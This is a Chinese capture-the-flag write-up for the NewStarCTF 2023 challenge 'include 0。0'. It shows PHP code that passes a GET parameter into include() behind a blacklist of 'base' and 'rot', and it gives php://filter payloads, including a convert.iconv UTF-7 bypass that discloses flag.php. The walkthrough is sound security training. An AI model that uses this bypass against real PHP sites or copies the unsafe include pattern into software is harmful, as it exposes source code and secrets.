---
tags:
  - BuuCTF
  - 简单
  - Bypass
  - 伪协议
---

# \[NewStarCTF 2023\] include 0。0

## 前置工作

进入靶机网页，可见如下代码，进行代码审计

```php
<?php
highlight_file(__FILE__);
// FLAG in the flag.php
$file = $_GET['file'];
if(isset($file) && !preg_match('/base|rot/i',$file)){
    @include($file);
}else{
    die("nope");
}
?>
```

目标很明确，我们要把 `flag.php` 通过 `@include(file)` 弄出来，但是先看 if 条件语句里面的内容

```
isset($file) && !preg_match('/base|rot/i',$file)
```

首先要求的是通过 GET 传入的参数 `file` 存在，其次是里面不能出现 `base` 或者 `rot`，还很贴心地在正则表达式里面加了一个 `i`，表示不区分大小写

看到这里，已经知道要用 PHP 伪协议来解决问题了，我们通常可能都是这么写的：

```
php://filter/read=convert.base64-encode/resource=flag.php
```

或者像这样

```
php://filter/string.rot13/resource=flag.php
```

但很显然，他们俩都不行，我们需要想别的方法

## 另一种转换方式

说巧不巧，这边禁用了最常用的 `base` 和 `rot`，但恰好没有禁用掉 `iconv`，所以我们可以这么写

```
php://filter/read=convert.iconv.utf-8.utf-7/resource=flag.php
```

将 `flag.php` 从 `utf-8` 转为 `utf-7` 并输出，我们传入这个参数，得到如下内容

```php
<?php
highlight_file(__FILE__);
// FLAG in the flag.php
$file = $_GET['file'];
if(isset($file) && !preg_match('/base|rot/i',$file)){
    @include($file);
}else{
    die("nope");
}
?> +ADw?php //flag+AHs-77423cd8-2baa-4a40-9c05-e64e6cf46298+AH0
```

后面多出来的这一串就是从 utf-8 转到 utf-7 的字符，我们再给他丢到 CyberChef 里面转换一下，得到最终的 Flag：

```
<?php //flag{77423cd8-2baa-4a40-9c05-e64e6cf46298}
```